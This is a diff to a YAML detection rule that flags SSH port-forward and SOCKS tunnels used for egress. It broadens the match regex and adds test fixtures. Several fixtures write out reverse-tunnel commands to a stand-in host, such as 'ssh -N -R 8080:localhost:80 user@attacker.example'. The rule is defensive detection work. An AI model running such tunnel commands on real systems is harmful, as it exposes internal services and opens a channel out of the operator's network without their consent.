@@ -1,5 +1,5 @@
 id: ssh-tunnel-egress
-version: 1
+version: 2
 title: SSH tunnel opened for egress (local / remote forward or SOCKS)
 description: >
   An SSH client is invoked with a -R (remote) port-forward, -L (local)
@@ -12,7 +12,9 @@ description: >
   has no legitimate reason to expose a port on either side of its
   operator's network. The rule is anchored on the ssh binary at a
   command boundary and matches the long form (--remote-forward,
-  --local-forward, --dynamic) and the short form (-R/-L/-D).
+  --local-forward, --dynamic) and the short form (-R/-L/-D) wherever it
+  appears among the arguments, including inside a cluster of boolean
+  flags such as -fNL.
 severity: high
 status: experimental
 posture: detect
@@ -23,7 +25,7 @@ taxonomy:
 
 match: >
   e.event.action == "command.executed" && (
-    e.command.command.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(ssh|scp|sftp)\\b\\s+(-(R|L)\\s*\\d+:|-D\\s*\\d+\\b|--remote-forward\\b|--local-forward\\b|--dynamic\\b)")
+    e.command.command.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(ssh|scp|sftp)\\b([^;&|]*\\s)?((?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*[RL])\\s*\\d+:|(?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*D)\\s*\\d+\\b|--remote-forward\\b|--local-forward\\b|--dynamic\\b)")
   )
 
 emit:
@@ -59,6 +61,30 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "sudo ssh -R 8080:localhost:80 user@attacker.example" }
+        session: { id: s1 }
+  - name: ssh_no_shell_then_reverse_tunnel
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -N -R 8080:localhost:80 user@attacker.example" }
+        session: { id: s1 }
+  - name: ssh_clustered_local_forward
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -fNL 9000:internal.host:80 user@jump" }
+        session: { id: s1 }
+  - name: ssh_forward_after_destination
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh user@attacker.example -R 2222:localhost:22" }
+        session: { id: s1 }
+  - name: remote_ls_with_ld_flag
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh user@server ls -ld 755" }
         session: { id: s1 }
   - name: ordinary_ssh_login
     verdict: no_match
